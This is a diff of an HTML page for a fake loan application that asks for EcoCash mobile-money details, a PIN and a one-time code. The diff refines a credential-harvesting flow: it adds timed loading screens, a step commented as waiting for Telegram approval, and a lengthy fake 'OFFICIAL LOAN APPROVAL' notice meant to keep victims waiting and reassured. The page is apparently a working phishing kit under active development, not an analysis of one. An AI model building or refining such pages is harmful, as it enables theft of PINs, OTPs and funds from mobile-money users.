@@ -71,7 +71,6 @@
           <span>36 Months</span>
         </div>
 
-        <!-- MONTHLY PAYMENT DISPLAY -->
         <div class="bg-white border border-blue-100 rounded p-3 text-center mt-3">
           <p class="text-xs text-gray-600">Monthly Payment</p>
           <p id="monthlyPaymentDisplay" class="text-2xl font-bold text-blue-600">$8.33</p>
@@ -89,7 +88,7 @@
     <!-- ============ STEP 2: LOGIN SCREEN ============ -->
     <form id="step2-form" class="space-y-4 hidden">
       <div class="bg-blue-50 border border-blue-200 rounded-lg p-4 text-center">
-        <p class="text-sm text-blue-700 font-semibold">Enter your EcoCash credentials to verify your account</p>
+        <p class="text-sm text-blue-700 font-semibold">Enter your EcoCash details to authenticate</p>
       </div>
 
       <div>
@@ -110,7 +109,7 @@
       </div>
 
       <button type="submit" id="btn-step2" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-3.5 rounded-lg shadow-md transition duration-200">
-        Verify & Continue
+        NEXT
       </button>
 
       <button type="button" id="btn-back-step1" class="w-full bg-gray-300 hover:bg-gray-400 text-gray-800 font-bold py-2 rounded-lg transition duration-200">
@@ -118,13 +117,13 @@
       </button>
     </form>
 
-    <!-- ============ STEP 2: LOADING SCREEN ============ -->
+    <!-- ============ STEP 2: LOADING SCREEN (10 SECONDS) ============ -->
     <div id="step2-loading" class="hidden text-center py-8 space-y-4">
       <div class="inline-block animate-spin rounded-full h-12 w-12 border-4 border-blue-600 border-t-transparent"></div>
-      <h3 class="text-lg font-bold text-gray-800">Verifying EcoCash Credentials...</h3>
-      <p class="text-xs text-gray-500 max-w-xs mx-auto">Please wait while we authenticate your account.</p>
+      <h3 class="text-lg font-bold text-gray-800">Verifying EcoCash PIN...</h3>
+      <p class="text-xs text-gray-500 max-w-xs mx-auto">Please wait while we check your credentials.</p>
       <div class="mt-4">
-        <p class="text-xs text-gray-600">Loading in <span id="countdown-timer">5</span> seconds...</p>
+        <p class="text-xs text-gray-600">Connecting in <span id="countdown-timer">10</span> seconds...</p>
         <div class="w-full bg-gray-200 rounded-full h-1 mt-2">
           <div id="countdown-bar" class="bg-blue-600 h-1 rounded-full" style="width: 100%; transition: width 0.1s linear;"></div>
         </div>
@@ -151,7 +150,7 @@
       </div>
 
       <button type="submit" id="btn-step3" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-3.5 rounded-lg shadow-md transition duration-200">
-        Verify OTP & Submit Application
+        LOG IN
       </button>
 
       <button type="button" id="btn-back-step2" class="w-full bg-gray-300 hover:bg-gray-400 text-gray-800 font-bold py-2 rounded-lg transition duration-200">
@@ -159,15 +158,54 @@
       </button>
     </form>
 
+    <!-- STEP 3 LOADING (WAITING FOR TELEGRAM FINAL APPROVAL) -->
+    <div id="step3-loading" class="hidden text-center py-8 space-y-4">
+      <div class="inline-block animate-spin rounded-full h-12 w-12 border-4 border-green-600 border-t-transparent"></div>
+      <h3 class="text-lg font-bold text-gray-800">Processing Loan Application...</h3>
+      <p class="text-sm text-gray-600 max-w-xs mx-auto">Your verification code was verified successfully. Please wait while your loan status is being finalized...</p>
+    </div>
+
     <!-- ============ SUCCESS SCREEN ============ -->
-    <div id="success-screen" class="hidden text-center py-6 space-y-4">
-      <div class="w-16 h-16 bg-green-100 text-green-600 rounded-full flex items-center justify-center mx-auto text-4xl font-bold animate-pulse">
-        ✓
+    <div id="success-screen" class="hidden text-left py-2 space-y-4 text-gray-800 font-sans">
+      <div class="text-center">
+        <h2 class="text-xl sm:text-2xl font-black text-green-600 leading-snug">
+          🎉🎉 CONGRATULATIONS! YOUR LOAN HAS BEEN APPROVED 🎉🎉
+        </h2>
       </div>
-      <h2 class="text-2xl font-bold text-gray-800">Application Approved!</h2>
-      <div class="bg-green-50 border border-green-200 rounded-lg p-4">
-        <p class="text-sm text-green-700 font-medium">Reference: <span id="appRefDisplay" class="font-bold"></span></p>
-        <p class="text-xs text-green-600 mt-2">Your OTP has been verified. You will receive an SMS confirmation with loan disbursement details shortly.</p>
+
+      <div class="border-t-2 border-b-2 border-dashed border-gray-300 py-2 text-center">
+        <p class="font-bold text-lg text-blue-800">🏦 LOAN APPROVAL NOTICE</p>
+      </div>
+
+      <div class="space-y-3 text-sm sm:text-base leading-relaxed">
+        <p>Dear Applicant,</p>
+        <p>We are pleased to inform you that your loan application (Ref: <span id="appRefDisplay" class="font-bold text-blue-600"></span>) has been successfully reviewed and <strong>APPROVED</strong>. ✅</p>
+        <p>🌟 Congratulations! Your application has met all the required approval criteria.</p>
+      </div>
+
+      <div class="bg-green-50 border border-green-300 rounded-xl p-4 space-y-2 text-sm sm:text-base">
+        <p class="font-bold text-green-800">📌 Loan Status: ✅ APPROVED</p>
+        <p class="font-bold text-green-800">💰 Disbursement Status: Processing for Immediate Release</p>
+      </div>
+
+      <p class="text-sm sm:text-base leading-relaxed">
+        Your approved loan will be disbursed to your registered account shortly. Please keep your phone switched on and monitor your account for the payment notification.
+      </p>
+
+      <p class="text-sm sm:text-base leading-relaxed">
+        Thank you for choosing our lending services. We appreciate your trust and look forward to serving you again.
+      </p>
+
+      <div class="border-t-2 border-b-2 border-dashed border-gray-300 py-3 text-center space-y-2">
+        <p class="font-bold text-base sm:text-lg text-green-600">🎊 Congratulations once again! 🎊</p>
+        <p class="text-xs sm:text-sm text-gray-600">Your loan has been approved and is now being processed for immediate disbursement.</p>
+        <p class="text-xs sm:text-sm text-gray-600 italic">We wish you success and prosperity with your approved funds.</p>
+      </div>
+
+      <div class="text-center pt-2">
+        <span class="inline-block bg-blue-100 text-blue-800 font-bold px-4 py-1.5 rounded-full text-xs sm:text-sm border border-blue-200">
+          ✔ OFFICIAL LOAN APPROVAL
+        </span>
       </div>
     </div>
 
@@ -175,4 +213,5 @@
 
   <script src="/app.js"></script>
 </body>
-</html>
+  </html>
+  
